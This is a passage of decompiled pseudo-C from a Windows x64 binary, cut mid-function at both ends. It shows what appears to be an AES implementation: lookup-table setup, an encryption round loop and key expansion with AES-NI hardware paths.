  *((_QWORD *)v15 + 37) = v22;
  *((_QWORD *)v15 + 38) = 16 * ((a6 & 1 | 2) - *(_DWORD *)(v9 + 16) + 12);
  sub_140062FB0(*(const __m128i **)(v9 + 288), (__m128i *)&v23[(unsigned __int8)-(signed __int64)v23], v22);
  return a5 & 0xF;
}
// 1400DB470: using guessed type __int64 qword_1400DB470;
// 1400DBD4C: using guessed type char byte_1400DBD4C;
// 1400DBD51: using guessed type char byte_1400DBD51;
// 140065060: using guessed type char var_250[496];

//----- (00000001400652B0) ----------------------------------------------------
__int64 sub_1400652B0()
{
  signed __int64 v0; // r14
  __int64 v1; // r9
  unsigned int v2; // esi
  unsigned int v3; // ebx
  __int64 v4; // rdx
  __int64 result; // rax

  v0 = 0i64;
  do
  {
    v1 = *(unsigned __int8 *)(v0++ + 5369420992i64);
    v2 = ((unsigned int)v1 >> 5) & 1;
    v3 = ((unsigned int)v1 >> 5) & 2;
    v4 = 18546688 * (((unsigned int)v1 >> 5) & 4) ^ 18546688 * v3 ^ 18546688 * v2 ^ (((unsigned int)v1 ^ 8 * (_DWORD)v1) << 16) | 452984832 * (((unsigned int)v1 >> 5) & 4) ^ 452984832 * (((unsigned int)v1 >> 6) & 2) ^ 452984832 * (((unsigned int)v1 >> 6) & 1) ^ 452984832 * v3 ^ 452984832 * v2 ^ 452984832 * ((unsigned int)v1 >> 7) ^ (((unsigned int)v1 ^ 2 * ((unsigned int)v1 ^ 2 * (_DWORD)v1)) << 25) | 72448 * (((unsigned int)v1 >> 5) & 4) ^ 72448 * (((unsigned int)v1 >> 6) & 1) ^ 72448 * v3 ^ 72448 * v2 ^ (((unsigned int)v1 ^ 4 * ((unsigned int)v1 ^ 2 * (_DWORD)v1)) << 8) ^ 72448 * (((unsigned int)v1 >> 6) & 2);
    result = (unsigned int)v1 ^ 4 * (_DWORD)v1;
    qword_1400DB498[v0] = v1 | v4 | ((v4 | v1 ^ 283 * (((unsigned int)v1 >> 5) & 4) ^ 283 * v3 ^ 283 * v2 ^ 283 * ((unsigned int)v1 >> 7) ^ (unsigned __int64)(unsigned int)(2 * result)) << 32);
  }
  while ( v0 < 256 );
  byte_1400DB481 = 1;
  return result;
}
// 1400DB481: using guessed type char byte_1400DB481;
// 1400DB498: using guessed type __int64 qword_1400DB498[];

//----- (0000000140065440) ----------------------------------------------------
__int64 sub_140065440()
{
  signed __int64 v0; // r11
  __int64 v1; // r10
  __int64 result; // rax
  __int64 v3; // rcx

  v0 = 0i64;
  do
  {
    v1 = *(unsigned __int8 *)(v0++ + 5369420736i64);
    result = (unsigned int)(2 * v1);
    v3 = ((_DWORD)v1 << 25) ^ 452984832 * ((unsigned int)v1 >> 7) | ((((_DWORD)v1 << 8) | (unsigned int)v1) << 8);
    qword_1400DAC68[v0] = v3 | ((v3 | v1 ^ result ^ 283 * ((unsigned int)v1 >> 7)) << 32);
  }
  while ( v0 < 256 );
  qword_1400DB478 = 0i64;
  qword_1400DB470 = 0i64;
  byte_1400DB480 = 1;
  return result;
}
// 1400DAC68: using guessed type __int64 qword_1400DAC68[];
// 1400DB470: using guessed type __int64 qword_1400DB470;
// 1400DB478: using guessed type __int64 qword_1400DB478;
// 1400DB480: using guessed type char byte_1400DB480;

//----- (00000001400654E0) ----------------------------------------------------
_DWORD *__fastcall sub_1400654E0(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // rcx
  _DWORD *v4; // r9
  _DWORD *result; // rax
  unsigned __int64 v6; // rcx
  _DWORD *v7; // rdi
  __int64 v8; // r10
  _DWORD *v9; // rdi

  v2 = a1;
  v3 = *(_QWORD *)(a1 + 256);
  v4 = *(_DWORD **)(v2 + 264);
  result = (_DWORD *)(v2 + (-(signed int)v2 & 0xF));
  if ( v4 == result )
  {
    if ( a2 <= 0x3C )
    {
      if ( v3 > a2 )
      {
        v6 = v3 - a2;
        v7 = &v4[a2];
        result = 0i64;
        while ( v6 )
        {
          *v7 = 0;
          ++v7;
          --v6;
        }
      }
      *(_QWORD *)(v2 + 264) = v4;
      *(_QWORD *)(v2 + 256) = a2;
      return result;
    }
    goto LABEL_11;
  }
  if ( a2 > 0x3C || *(_BYTE *)(v2 + 249) )
  {
LABEL_11:
    v8 = 0i64;
    goto LABEL_12;
  }
  *(_BYTE *)(v2 + 249) = 1;
  v8 = v2 + (-(signed int)v2 & 0xF);
LABEL_12:
  if ( v4 == result )
  {
    v9 = v4;
    result = 0i64;
    *(_BYTE *)(v2 + 249) = 0;
    while ( v3 )
    {
      *v9 = 0;
      ++v9;
      --v3;
    }
  }
  *(_QWORD *)(v2 + 264) = v8;
  *(_QWORD *)(v2 + 256) = a2;
  return result;
}

//----- (0000000140065580) ----------------------------------------------------
unsigned __int64 __fastcall sub_140065580(__int64 a1, __m128i *a2, const __m128i *a3, __m128i *a4)
{
  char v4; // al
  const __m128i *v5; // rbx
  __m128i *v6; // rdi
  __m128i *v7; // r14
  unsigned __int64 result; // rax
  _DWORD *v9; // rdi
  int v10; // er8
  int v11; // er9
  int v12; // er10
  int v13; // er12
  int v14; // ebp
  int v15; // er14
  int v16; // er12
  int v17; // er13
  int v18; // er15
  _DWORD *v19; // rdi
  int v20; // esi
  int v21; // edx
  unsigned int v22; // ecx
  __int64 v23; // rax
  int v24; // edx
  unsigned int v25; // er12
  unsigned int v26; // er9
  unsigned int v27; // er8
  __int64 v28; // rcx
  int v29; // er15
  int v30; // er14
  __int64 v31; // rax
  int v32; // ebp
  __int64 v33; // rax
  int v34; // edx
  __int64 v35; // rax
  int v36; // er14
  __int64 v37; // rax
  int v38; // er13
  int v39; // edx
  __int64 v40; // rax
  unsigned int v41; // er13
  unsigned int v42; // er14
  unsigned int v43; // er15
  unsigned int v44; // ebp
  int v45; // er12
  __int64 v46; // rax
  unsigned int v47; // ebp
  int v48; // er9
  __int64 v49; // rax
  int v50; // er11
  __int64 v51; // rax
  unsigned int v52; // er14
  int v53; // er11
  int v54; // er10
  __int64 v55; // rax
  unsigned int v56; // er13
  int v57; // er10
  int v58; // er8
  __int64 v59; // rax
  unsigned int v60; // er15
  unsigned int v61; // er8
  __int64 v62; // rax
  unsigned int v63; // er10
  unsigned int v64; // er9
  unsigned int v65; // er11
  __int64 v66; // rax
  int v67; // er14
  __int64 v68; // rax
  int v69; // er13
  int v70; // er14
  __int64 v71; // rax
  int v72; // er13
  __int64 v73; // rcx
  __int64 v74; // rax
  int v75; // er15
  __int64 v76; // rax
  __int64 v77; // rax
  __int64 v78; // rax
  unsigned int v79; // er14
  __int64 v80; // rax
  __int64 v81; // rax
  unsigned int v82; // er13
  __int64 v83; // rax
  __int64 v84; // rax
  unsigned int v85; // er15
  __int64 v86; // rax
  unsigned int v87; // er15
  __int64 v88; // rax
  unsigned int v89; // ebp
  __int64 v90; // rax
  unsigned int v91; // ebp
  const __m128i *v92; // rbx
  int v93; // ecx
  int v94; // ecx
  int v95; // ecx
  int v96; // [rsp+30h] [rbp-88h]
  int v97; // [rsp+34h] [rbp-84h]
  int v98; // [rsp+38h] [rbp-80h]
  int *v99; // [rsp+40h] [rbp-78h]
  const __m128i *v100; // [rsp+48h] [rbp-70h]
  __int64 v101; // [rsp+50h] [rbp-68h]
  int v102; // [rsp+50h] [rbp-68h]
  int v103; // [rsp+54h] [rbp-64h]
  int v104; // [rsp+58h] [rbp-60h]
  int v105; // [rsp+5Ch] [rbp-5Ch]

  v4 = byte_1400DBD4C;
  v5 = a3;
  v6 = a4;
  v99 = (int *)a4;
  v7 = a2;
  v101 = a1;
  v100 = a3;
  if ( !byte_1400DBD4C )
  {
    sub_14006AA50();
    v4 = byte_1400DBD4C;
    a1 = v101;
  }
  if ( byte_1400DBD51 )
    return sub_140064FA0(a1, v7, v5, v6, 0x10ui64, 0);
  v9 = *(_DWORD **)(a1 + 288);
  v10 = HIDWORD(v7->m128i_i64[0]) ^ v9[1];
  v11 = LODWORD(v7->m128i_i64[1]) ^ v9[2];
  v12 = HIDWORD(v7->m128i_i64[1]) ^ v9[3];
  v13 = v7->m128i_i64[0];
  v14 = v9[7];
  v15 = v9[6];
  v16 = *v9 ^ v13;
  v17 = v9[5];
  v18 = v9[4];
  v19 = v9 + 8;
  v97 = v10;
  v98 = v11;
  v96 = v12;
  if ( !v4 )
  {
    sub_14006AA50();
    v10 = v97;
    v11 = v98;
  }
  v20 = 0;
  v21 = 0;
  v22 = 0;
  do
  {
    v23 = v22;
    v22 += dword_1400D80C0;
    v21 &= *(_DWORD *)((char *)&unk_1400DB4A0 + v23);
  }
  while ( v22 < 0x800 );
  v24 = dword_1400DBC98 & v21;
  v25 = v24 | v16;
  v26 = v24 | v11;
  v27 = v24 | v10;
  v28 = (unsigned __int8)v26;
  v26 >>= 8;
  v29 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * ((unsigned __int16)(v24 | v96) >> 8) + 1) ^ v18;
  v30 = *((_DWORD *)&unk_1400DB4A0 + 2 * v28 + 1) ^ *(_DWORD *)((char *)&unk_1400DB4A0
                                                              + 8 * ((v24 | (unsigned int)v96) >> 24)
                                                              + 3) ^ v15;
  v31 = (unsigned __int8)v26;
  v26 >>= 8;
  v32 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v31 + 1) ^ *((_DWORD *)&unk_1400DB4A0
                                                            + 2 * (unsigned __int8)(v24 | v96)
                                                            + 1) ^ v14;
  v33 = (unsigned __int8)v27;
  v27 >>= 8;
  v34 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)((v24 | (unsigned int)v96) >> 16) + 2) ^ *((_DWORD *)&unk_1400DB4A0 + 2 * v33 + 1) ^ *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (v26 >> 8) + 3);
  v35 = (unsigned __int8)v27;
  v27 >>= 8;
  v36 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v35 + 1) ^ v30;
  v37 = (unsigned __int8)v25;
  v25 >>= 8;
  v38 = v34 ^ v17;
  v39 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)v26 + 2) ^ *((_DWORD *)&unk_1400DB4A0 + 2 * v37 + 1) ^ *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (v27 >> 8) + 3);
  v40 = (unsigned __int8)v25;
  v25 >>= 8;
  v41 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v40 + 1) ^ v38;
  v42 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)v25 + 2) ^ v36;
  v43 = v39 ^ v29;
  v44 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)v27 + 2) ^ *(_DWORD *)((char *)&unk_1400DB4A0
                                                                                       + 8 * (v25 >> 8)
                                                                                       + 3) ^ v32;
  v45 = (*(_DWORD *)(v101 + 16) >> 1) - 1;
  do
  {
    v46 = (unsigned __int8)v44;
    v47 = v44 >> 8;
    v48 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v46 + 3);
    v49 = (unsigned __int8)v47;
    v47 >>= 8;
    v50 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v49 + 2);
    v51 = (unsigned __int8)v42;
    v52 = v42 >> 8;
    v53 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v51 + 3) ^ v19[1] ^ v50;
    v54 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)v52 + 2);
    v52 >>= 8;
    v55 = (unsigned __int8)v41;
    v56 = v41 >> 8;
    v57 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v55 + 3) ^ *v19 ^ *(_DWORD *)((char *)&unk_1400DB4A0
                                                                               + 8 * (unsigned __int8)v47
                                                                               + 1) ^ v54;
    v58 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)v56 + 2) ^ *((_DWORD *)&unk_1400DB4A0
                                                                               + 2 * (v47 >> 8)
                                                                               + 1);
    v56 >>= 8;
    v59 = (unsigned __int8)v43;
    v60 = v43 >> 8;
    v61 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v59 + 3) ^ v19[3] ^ *(_DWORD *)((char *)&unk_1400DB4A0
                                                                                 + 8 * (unsigned __int8)v52
                                                                                 + 1) ^ v58;
    v62 = (unsigned __int8)v60;
    v60 >>= 8;
    v63 = *((_DWORD *)&unk_1400DB4A0 + 2 * (v60 >> 8) + 1) ^ v57;
    v64 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)v56 + 1) ^ *(_DWORD *)((char *)&unk_1400DB4A0
                                                                                         + 8 * v62
                                                                                         + 2) ^ *((_DWORD *)&unk_1400DB4A0
                                                                                                + 2 * (v52 >> 8)
                                                                                                + 1) ^ v19[2] ^ v48;
    v65 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)v60 + 1) ^ *((_DWORD *)&unk_1400DB4A0
                                                                               + 2 * (v56 >> 8)
                                                                               + 1) ^ v53;
    v66 = (unsigned __int8)v61;
    v61 >>= 8;
    v67 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v66 + 3);
    v68 = (unsigned __int8)v61;
    v61 >>= 8;
    v69 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v68 + 2);
    v70 = v19[6] ^ v67;
    v71 = (unsigned __int8)v64;
    v64 >>= 8;
    v72 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v71 + 3) ^ v19[5] ^ v69;
    v73 = (unsigned __int8)v64;
    v64 >>= 8;
    v74 = (unsigned __int8)v65;
    v65 >>= 8;
    v75 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v74 + 3) ^ v19[4] ^ *(_DWORD *)((char *)&unk_1400DB4A0
                                                                                 + 8 * (unsigned __int8)v61
                                                                                 + 1) ^ *(_DWORD *)((char *)&unk_1400DB4A0
                                                                                                  + 8 * v73
                                                                                                  + 2);
    v76 = (unsigned __int8)v65;
    v65 >>= 8;
    v44 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)v63 + 3) ^ v19[7] ^ *(_DWORD *)((char *)&unk_1400DB4A0
                                                                                                  + 8 * (unsigned __int8)v64
                                                                                                  + 1) ^ *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * v76 + 2) ^ *((_DWORD *)&unk_1400DB4A0 + 2 * (v61 >> 8) + 1);
    v63 >>= 8;
    v19 += 8;
    v77 = (unsigned __int8)v63;
    v63 >>= 8;
    v43 = *((_DWORD *)&unk_1400DB4A0 + 2 * (v63 >> 8) + 1) ^ v75;
    v42 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)v65 + 1) ^ *(_DWORD *)((char *)&unk_1400DB4A0
                                                                                         + 8 * v77
                                                                                         + 2) ^ *((_DWORD *)&unk_1400DB4A0
                                                                                                + 2 * (v64 >> 8)
                                                                                                + 1) ^ v70;
    v41 = *(_DWORD *)((char *)&unk_1400DB4A0 + 8 * (unsigned __int8)v63 + 1) ^ *((_DWORD *)&unk_1400DB4A0
                                                                               + 2 * (v65 >> 8)
                                                                               + 1) ^ v72;
    --v45;
  }
  while ( v45 );
  v78 = (unsigned __int8)v42;
  v79 = v42 >> 8;
  HIBYTE(v103) = *((_BYTE *)&unk_1400DB4A0 + 8 * v78);
  v80 = (unsigned __int8)v79;
  v79 >>= 8;
  BYTE2(v102) = *((_BYTE *)&unk_1400DB4A0 + 8 * v80);
  BYTE1(v105) = *((_BYTE *)&unk_1400DB4A0 + 8 * (unsigned __int8)v79);
  LOBYTE(v104) = *((_BYTE *)&unk_1400DB4A0 + 8 * ((unsigned __int64)v79 >> 8));
  v81 = (unsigned __int8)v41;
  v82 = v41 >> 8;
  HIBYTE(v102) = *((_BYTE *)&unk_1400DB4A0 + 8 * v81);
  v83 = (unsigned __int8)v82;
  v82 >>= 8;
  BYTE2(v105) = *((_BYTE *)&unk_1400DB4A0 + 8 * v83);
  BYTE1(v104) = *((_BYTE *)&unk_1400DB4A0 + 8 * (unsigned __int8)v82);
  LOBYTE(v103) = *((_BYTE *)&unk_1400DB4A0 + 8 * ((unsigned __int64)v82 >> 8));
  v84 = (unsigned __int8)v43;
  v85 = v43 >> 8;
  HIBYTE(v105) = *((_BYTE *)&unk_1400DB4A0 + 8 * v84);
  v86 = (unsigned __int8)v85;
  v87 = v85 >> 8;
  BYTE2(v104) = *((_BYTE *)&unk_1400DB4A0 + 8 * v86);
  BYTE1(v103) = *((_BYTE *)&unk_1400DB4A0 + 8 * (unsigned __int8)v87);
  v88 = (unsigned __int8)v44;
  v89 = v44 >> 8;
  HIBYTE(v104) = *((_BYTE *)&unk_1400DB4A0 + 8 * v88);
  v90 = (unsigned __int8)v89;
  v91 = v89 >> 8;
  BYTE2(v103) = *((_BYTE *)&unk_1400DB4A0 + 8 * v90);
  v92 = v100;
  LOBYTE(v105) = *((_BYTE *)&unk_1400DB4A0 + 8 * ((unsigned __int64)v91 >> 8));
  if ( v100 )
    v93 = v100->m128i_i64[0];
  else
    v93 = 0;
  result = (unsigned __int64)v99;
  BYTE1(v102) = *((_BYTE *)&unk_1400DB4A0 + 8 * (unsigned __int8)v91);
  LOBYTE(v102) = *((_BYTE *)&unk_1400DB4A0 + 8 * ((unsigned __int64)v87 >> 8));
  *v99 = *v19 ^ v102 ^ v93;
  if ( v100 )
    v92 = (const __m128i *)((char *)v100 + 4);
  if ( v92 )
    v94 = v92->m128i_i64[0];
  else
    v94 = 0;
  v99[1] = v103 ^ v19[1] ^ v94;
  if ( v92 )
    v92 = (const __m128i *)((char *)v92 + 4);
  if ( v92 )
    v95 = v92->m128i_i64[0];
  else
    v95 = 0;
  v99[2] = v104 ^ v19[2] ^ v95;
  if ( v92 )
    v92 = (const __m128i *)((char *)v92 + 4);
  if ( v92 )
    v20 = v92->m128i_i64[0];
  v99[3] = v105 ^ v19[3] ^ v20;
  return result;
}
// 1400D80C0: using guessed type int dword_1400D80C0;
// 1400DBC98: using guessed type int dword_1400DBC98;
// 1400DBD4C: using guessed type char byte_1400DBD4C;
// 1400DBD51: using guessed type char byte_1400DBD51;

//----- (0000000140065AF0) ----------------------------------------------------
unsigned __int64 __fastcall sub_140065AF0(__int64 a1, __m128i *a2, const __m128i *a3, __m128i *a4)
{
  return sub_140065060(a1, a2, a3, a4, 0x10ui64, 0);
}

//----- (0000000140065B10) ----------------------------------------------------
void __fastcall sub_140065B10(__int64 a1, char *a2, unsigned int a3)
{
  signed __int64 v3; // r15
  char *v4; // rbp
  __int64 v5; // r13
  unsigned int v6; // esi
  size_t v7; // r12
  int *v8; // rbx
  _DWORD *v10; // r10
  signed __int64 v12; // r11
  signed __int64 v13; // rdi
  int v14; // eax
  int *v15; // r9
  int v16; // edx
  signed __int64 v17; // r14
  signed __int64 v18; // rbp
  int v19; // er8
  signed __int64 v20; // rsi
  int v21; // eax
  int v22; // ecx
  int v25; // eax
  int v26; // ecx
  int v27; // eax
  int v28; // ecx
  int v30; // ecx
  int v31; // eax
  int v32; // ecx
  unsigned int v34; // er14
  __int64 v35; // rax
  __m128i v36; // xmm1
  unsigned int v43; // er14
  signed __int64 v44; // rax
  signed __int64 v45; // rdi
  unsigned int v46; // er11
  signed __int64 v47; // rsi
  _DWORD *v48; // r10
  int *v49; // r9
  int v50; // er8
  int v51; // edx
  int v52; // er8
  int v53; // eax
  __int64 v54; // r11
  __int64 v55; // rbp
  __int64 v56; // r13
  int v57; // ecx
  int v58; // eax
  int v59; // ecx
  int v60; // er8
  int v61; // eax
  int v62; // ecx
  int v63; // eax
  int v64; // edx
  int v65; // er8
  int v66; // eax
  int v67; // ecx
  unsigned int *v68; // rdi
  __int64 v69; // rsi
  __int64 v70; // rbp
  unsigned int v71; // er15
  unsigned int v72; // er9
  int *v73; // r10
  unsigned int v74; // er8
  int *v75; // rbx
  int v76; // er11
  __int64 v77; // rax
  unsigned int v78; // er8
  int *v79; // rbx
  int v80; // er11
  __int64 v81; // rax
  int v82; // er11
  unsigned int v83; // er9
  int *v84; // r10
  unsigned int v85; // er9
  int *v86; // r10
  unsigned int v87; // er8
  int *v88; // rbx
  int v89; // er11
  unsigned int *v90; // rbx
  int v91; // er11
  unsigned int *v92; // r10
  int *v93; // r10
  __int64 v94; // rax
  unsigned int v95; // er9
  int *v96; // r10
  __int64 v97; // rax
  int v98; // er8
  unsigned int v99; // er9
  int *v100; // r10
  __int64 v101; // rax
  int v102; // er8
  unsigned int v103; // er9
  unsigned __int32 v104; // edx
  unsigned __int32 v105; // edx
  unsigned __int32 v106; // edx
  unsigned __int32 v107; // edx
  __int64 v108; // [rsp+20h] [rbp-68h]
  __int64 v109; // [rsp+28h] [rbp-60h]
  unsigned __int64 v110; // [rsp+30h] [rbp-58h]
  __int64 v111; // [rsp+90h] [rbp+8h]
  void *Src; // [rsp+98h] [rbp+10h]

  Src = a2;
  v111 = a1;
  v3 = a1 + 32;
  v4 = a2;
  v5 = a1;
  v6 = a3 >> 2;
  v7 = a3;
  *(_DWORD *)(a1 + 24) = (a3 >> 2) + 6;
  sub_1400654E0(a1 + 32, 4 * ((a3 >> 2) + 6) + 4);
  v8 = *(int **)(v5 + 296);
  if ( !byte_1400DBD4C )
    sub_14006AA50();
  if ( byte_1400DBD51 )
  {
    _XMM6 = _mm_loadu_si128((const __m128i *)&v4[v7 - 16]);
    memcpy(v8, v4, v7);
    v10 = &unk_1400AD61C;
    __asm { aeskeygenassist xmm0, xmm6, 0 }
    v12 = v7 >> 2;
    v13 = 4 * (v7 >> 2) + 16;
    v14 = *v8 ^ _mm_extract_epi32(_XMM0, 3) ^ 1;
    v15 = &v8[v12];
    v8[v12] = v14;
    v16 = v14 ^ v8[1];
    v17 = v6 + 1;
    v8[v17] = v16;
    v18 = v6 + 2;
    v19 = v16 ^ v8[2];
    v20 = v6 + 3;
    v8[v18] = v19;
    for ( v8[v20] = v19 ^ v8[3];
          (int *)((char *)v8 + v13) != (int *)(*(_QWORD *)(v3 + 264) + 4i64 * *(_QWORD *)(v3 + 256));
          v8[v20] = v32 ^ v8[3] )
    {
      if ( (_DWORD)v7 == 24 )
      {
        v21 = v8[4] ^ v8[9];
        v22 = v21 ^ v8[5];
        v8[10] = v21;
        v8[11] = v22;
        _XMM6 = _mm_insert_epi32(_XMM6, v22, 3);
      }
      else if ( (_DWORD)v7 == 32 )
      {
        _XMM6 = _mm_insert_epi32(_XMM6, v8[11], 3);
        __asm { aeskeygenassist xmm0, xmm6, 0 }
        v25 = v8[4] ^ _mm_extract_epi32(_XMM0, 2);
        v26 = v25 ^ v8[5];
        v8[12] = v25;
        v27 = v26 ^ v8[6];
        v8[13] = v26;
        v28 = v27 ^ v8[7];
        v8[14] = v27;
        v8[15] = v28;
        _XMM6 = _mm_insert_epi32(_XMM6, v28, 3);
      }
      else
      {
        _XMM6 = _mm_insert_epi32(_XMM6, v8[7], 3);
      }
      v8 = v15;
      v15 = (int *)((char *)v15 + v12 * 4);
      __asm { aeskeygenassist xmm0, xmm6, 0 }
      ++v10;
      v30 = *v8 ^ *(v10 - 1) ^ _mm_extract_epi32(_XMM0, 3);
      *v15 = v30;
      v31 = v30 ^ v8[1];
      v8[v17] = v31;
      v32 = v31 ^ v8[2];
      v8[v18] = v32;
    }
    if ( !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)(v5 + 8) + 56i64))(v5 + 8) )
    {
      _R8 = *(const __m128i **)(v5 + 296);
      v34 = 4;
      v35 = (unsigned int)(4 * *(_DWORD *)(v5 + 24));
      v36 = _mm_load_si128(_R8);
      _mm_store_si128(*(__m128i **)(v5 + 296), _mm_load_si128((const __m128i *)((char *)_R8 + 4 * v35)));
      _mm_store_si128((__m128i *)((char *)_R8 + 4 * v35), v36);
      _RDX = (unsigned int)(4 * *(_DWORD *)(v5 + 24) - 4);
      if ( (unsigned int)_RDX > 4 )
      {
        do
        {
          __asm { aesimc  xmm0, xmmword ptr [r8+rdx*4] }
          _RAX = v34;
          v34 += 4;
          __asm { aesimc  xmm1, xmmword ptr [r8+rax*4] }
          _mm_store_si128((__m128i *)((char *)_R8 + 4 * _RAX), _XMM0);
          _mm_store_si128((__m128i *)((char *)_R8 + 4 * _RDX), _XMM1);
          _RDX = (unsigned int)(_RDX - 4);
        }
        while ( v34 < (unsigned int)_RDX );
      }
      _RAX = v34;
      __asm { aesimc  xmm0, xmmword ptr [r8+rax*4] }
      _mm_store_si128((__m128i *)&_R8[v34 / 4], _XMM0);
    }
  }
  else
  {
    v43 = 4;
    v109 = v7;
    v108 = 4i64;
    memcpy_s(v8, 4 * (v7 >> 2), Src, v7);
    memset((char *)v8 + v7, 0, 4 * (v7 >> 2) - v7);
    v44 = sub_140064B80(&v109, (unsigned __int64 *)&v108);
    sub_140061550((unsigned __int64)v8, (unsigned __int64)v8, v44);
    v45 = v6 - 1;
    v46 = v6;
    v47 = v7 >> 2;
    v48 = &unk_1400ADDC4;
    v49 = &v8[v47];
    v50 = *v8 ^ byte_1400ADBC0[(unsigned int)v8[v45] >> 24] ^ ((byte_1400ADBC0[(unsigned __int8)v8[v45]] ^ ((byte_1400ADBC0[(unsigned __int8)(LOWORD(v8[v45]) >> 8)] ^ (byte_1400ADBC0[(unsigned __int8)((unsigned int)v8[v45] >> 16)] << 8)) << 8)) << 8) ^ 0x1000000;
    v109 = 4i64 * (v46 + 1);
    v8[v47] = v50;
    v51 = v50 ^ v8[1];
    v8[v46 + 1] = v51;
    v52 = v51 ^ v8[2];
    v8[v46 + 2] = v52;
    v108 = 4i64 * (v46 + 2);
    v53 = v52 ^ v8[3];
    v110 = 4i64 * (v46 + 3);
    v8[v110 / 4] = v53;
    if ( &v8[v47 + 4] != (int *)(*(_QWORD *)(v3 + 264) + 4i64 * *(_QWORD *)(v3 + 256)) )
    {
      v54 = v109;
      v55 = v108;
      v56 = v110;
      do
      {
        if ( (_DWORD)v7 == 24 )
        {
          v57 = v8[4] ^ v8[9];
          v58 = v57 ^ v8[5];
          v8[10] = v57;
          v8[11] = v58;
        }
        else if ( (_DWORD)v7 == 32 )
        {
          v59 = v8[6];
          v60 = v8[4] ^ byte_1400ADBC0[(unsigned __int8)v8[11]] ^ ((byte_1400ADBC0[(unsigned __int8)(*((_WORD *)v8 + 22) >> 8)] ^ ((byte_1400ADBC0[(unsigned __int8)((unsigned int)v8[11] >> 16)] ^ (byte_1400ADBC0[(unsigned int)v8[11] >> 24] << 8)) << 8)) << 8);
          v61 = v60 ^ v8[5];
          v8[12] = v60;
          v62 = v61 ^ v59;
          v8[13] = v61;
          v63 = v62 ^ v8[7];
          v8[14] = v62;
          v8[15] = v63;
        }
        v64 = v49[v45];
        v8 = v49;
        v49 = (int *)((char *)v49 + v47 * 4);
        ++v48;
        v65 = *(v48 - 1) ^ *v8 ^ byte_1400ADBC0[HIBYTE(v64)] ^ ((byte_1400ADBC0[(unsigned __int8)v64] ^ ((byte_1400ADBC0[BYTE1(v64)] ^ (byte_1400ADBC0[BYTE2(v64)] << 8)) << 8)) << 8);
        *v49 = v65;
        v66 = v65 ^ v8[1];
        *(int *)((char *)v8 + v54) = v66;
        v67 = v66 ^ v8[2];
        *(int *)((char *)v8 + v55) = v67;
        *(int *)((char *)v8 + v56) = v67 ^ v8[3];
      }
      while ( &v8[v47 + 4] != (int *)(*(_QWORD *)(v3 + 264) + 4i64 * *(_QWORD *)(v3 + 256)) );
      v5 = v111;
      v43 = 4;
    }
    v68 = *(unsigned int **)(v5 + 296);
    if ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)(v5 + 8) + 56i64))(v5 + 8) )
    {
      if ( !byte_1400DB480 )
        sub_140065440();
      sub_140061550((unsigned __int64)v68, (unsigned __int64)v68, 0x10ui64);
      sub_140061550(
        (unsigned __int64)&v68[4 * *(_DWORD *)(v5 + 24)],
        (unsigned __int64)&v68[4 * *(_DWORD *)(v5 + 24)],
        0x10ui64);
    }
    else
    {
      if ( !byte_1400DB481 )
        sub_1400652B0();
      v69 = (unsigned int)(4 * *(_DWORD *)(v5 + 24) - 4);
      if ( (unsigned int)v69 > 4 )
      {
        v70 = (unsigned int)(v69 + 2);
        v71 = 6;
        do
        {
          v72 = v68[v69];
          v73 = (int *)&v68[v69];
          v74 = v68[v43];
          v75 = (int *)&v68[v43];
          v76 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v75]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[BYTE1(v74)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(v68[v43] >> 16)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[v68[v43] >> 24]] + 3);
          v77 = v71 - 1;
          *v75 = *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[*(unsigned __int8 *)v73]] + 2) ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[BYTE1(v72)]] + 1) ^ dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(v68[v69] >> 16)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[v68[v69] >> 24]] + 3);
          *v73 = v76;
          v78 = v68[v77];
          v79 = (int *)&v68[v77];
          v80 = dword_1400DB4A1[2 * byte_1400ADBC0[(unsigned __int8)(v68[v77] >> 16)]] ^ *(int *)((char *)&dword_1400DB4A1[2 * byte_1400ADBC0[v68[v77] >> 24]]
                                                                                                + 3);
          v81 = (unsigned int)(v70 - 1);
